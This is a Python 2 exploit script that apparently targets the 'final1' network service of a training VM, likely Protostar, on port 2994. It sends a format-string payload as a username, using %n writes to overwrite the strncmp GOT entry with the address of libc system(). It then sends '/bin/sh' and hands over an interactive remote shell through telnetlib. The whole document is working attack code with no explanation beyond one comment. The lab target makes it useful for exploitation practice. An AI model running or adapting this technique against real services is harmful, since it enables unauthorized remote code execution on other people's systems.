#!/usr/bin/python

import socket
import struct
import telnetlib

IP = "192.168.43.218"	#CHANGE THIS
PORT = 2994				

sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
sock.connect((IP , PORT))


STRNCMP_GOT = struct.pack("I" , 0x804a1a8)
STRNCMP_GOT_P2 = struct.pack("I" , 0x804a1a8 + 2)
LIBC_SYSTEM = struct.pack("I" , 0xb7ecffb0)


remote_ip , remote_port = sock.getsockname()
hostname = remote_ip + ":" + str(remote_port)

hostname_len_left = 24 - len(hostname)

def read_until(check):
    	buffer = ""
	while check not in buffer:
		buffer += sock.recv(1)
	return buffer

exp = "A" * hostname_len_left + STRNCMP_GOT + STRNCMP_GOT_P2
exp += "%17$65408x"
exp += "%17$n"
exp += "%18$47164x"
exp += "%18$n" 

print read_until("[final1] $ ")
sock.send("username " + exp + "\n")
print read_until("[final1] $ ")
sock.send("login " + "admin" + "\n")

#Send The /bin/sh to system after chagne the got.

print read_until("[final1] $ ")
sock.send("/bin/sh\n")
print "Press Enter to start the session!"
sock.send("id")

tel = telnetlib.Telnet()
tel.sock = sock
tel.interact()

